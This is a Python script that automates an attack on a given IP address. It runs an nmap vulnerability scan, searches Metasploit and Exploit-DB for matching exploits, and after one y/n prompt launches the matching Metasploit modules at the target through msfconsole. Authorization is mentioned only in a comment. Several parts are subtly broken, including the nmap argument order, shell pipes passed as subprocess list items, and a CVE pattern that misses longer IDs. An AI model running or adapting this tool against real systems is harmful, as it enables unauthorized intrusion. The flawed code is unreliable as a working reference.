#!/usr/bin/env python3

import os
import re
import subprocess
import sys

# Check if user has necessary permissions
if os.geteuid() != 0:
    print("Please run as root")
    sys.exit()

# Validate command line arguments
if len(sys.argv) != 3:
    print("Usage: sudo python3 auto.py <IP address> <l/q>")
    sys.exit()

ip = sys.argv[1]
lq = sys.argv[2]

# Validate user input
if not re.match(r"^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$", ip):
    print("Invalid IP address")
    sys.exit()

if not re.match(r"^[lq]$", lq):
    print("Invalid input")
    sys.exit()

# Scan for vulnerabilities using Nmap
print("Scanning for vulnerabilities...")
if lq == "l":
    vuln_scan_result = subprocess.run(
        ["nmap", "-sV", "-sS", "--script", "vuln", "-T5", "-oG", "-Pn", "nmap-scan.txt", ip],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
else:
    vuln_scan_result = subprocess.run(
        ["nmap", "-sV", "-sS", "--script", "vuln", "-T1", "-oG", "-Pn", "nmap-scan.txt", ip],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

# Check if there are any open ports
with open("nmap-scan.txt", "r") as f:
    open_ports = []
    for line in f:
        if "Ports: " in line:
            open_ports = re.findall(r"(\d+)/(tcp|udp)\s+(\w+)\s+(\S+)\s+", line)
            break

    if not open_ports:
        print("No open ports found")
        sys.exit()

# Show brief output of vuln script results
print("Vulnerability scan results:")
with open("nmap-scan.txt", "r") as f:
    for match in re.findall(r"(CVE-\d{4}-\d{4}|MS\d{2}-\d{3})", f.read()):
        print(match)

# Search for exploits in multiple databases
print("Searching for exploits...")
print("Metasploit Framework:")
exploits_found = False
total_ports = len(open_ports)
count = 0
for port, protocol, service, version in open_ports:
    # Update the progress bar
    count += 1
    progress = count / total_ports * 100
    print(f"Progress: [{count}/{total_ports}] ({progress:.2f}%)", end="\r")

    # Search in Metasploit Framework
    if os.path.isdir("/usr/share/metasploit-framework/modules/exploits/"):
        exploits = subprocess.run(
            [
                "find",
                "/usr/share/metasploit-framework/modules/exploits/",
                "-type",
                "f",
                "-name",
                "*.rb",
                "-exec",
                "grep",
                "-H",
                "-i",
                "-e",
                "CVE-\\|MS",
                "{}",
                "+",
                "|",
                "grep",
                "-i",
                "-l",
                port,
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        if exploits.stdout:
            print(exploits.stdout.decode("utf-8"))
            exploits_found = True

    # Search in other databases (e.g. Exploit-DB)
    print("Searching in Exploit-DB:")
    search_results = subprocess.run(
        [
            "searchsploit",
            "--colour",
            "-t",
            f"{port},{protocol},{service},{version}",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if search_results.stdout:
        print(search_results.stdout.decode("latin1"))
        exploits_found = True

    # Update progress bar
    progress = count / total_ports * 100
    print(f"Progress: [{count}/{total_ports}] ({progress:.2f}%)", end="\r")

# Check if any exploits were found
if not exploits_found:
    print("No exploits found")
    sys.exit()

# Execute discovered exploits (use with caution and proper authorization!)
execute_exploits = input("Would you like to execute discovered exploits (y/n)? ")
if execute_exploits.lower() == "y":
    with open("nmap-scan.txt", "r") as f:
        for line in f:
            exploit_match = re.search(r"(CVE-\d{4}-\d{4}|MS\d{2}-\d{3})", line)
            if exploit_match:
                exploit_name = exploit_match.group(1)
                exploit_path = (
                    subprocess.check_output(
                        [
                            "find",
                            "/usr/share/metasploit-framework/modules/exploits/",
                            "-type",
                            "f",
                            "-name",
                            "*.rb",
                            "-exec",
                            "grep",
                            "-H",
                            "-i",
                            "-e",
                            exploit_name,
                            "{}",
                            "+",
                            "|",
                            "awk",
                            "-F:",
                            "{print $1}",
                        ]
                    )
                    .decode("utf-8")
                    .strip()
                )
                print(f"Executing {exploit_name}...")
                subprocess.run(
                    [
                        "msfconsole",
                        "-x",
                        f"use {exploit_path}; set RHOSTS {ip}; run; exit;",
                    ]
                )
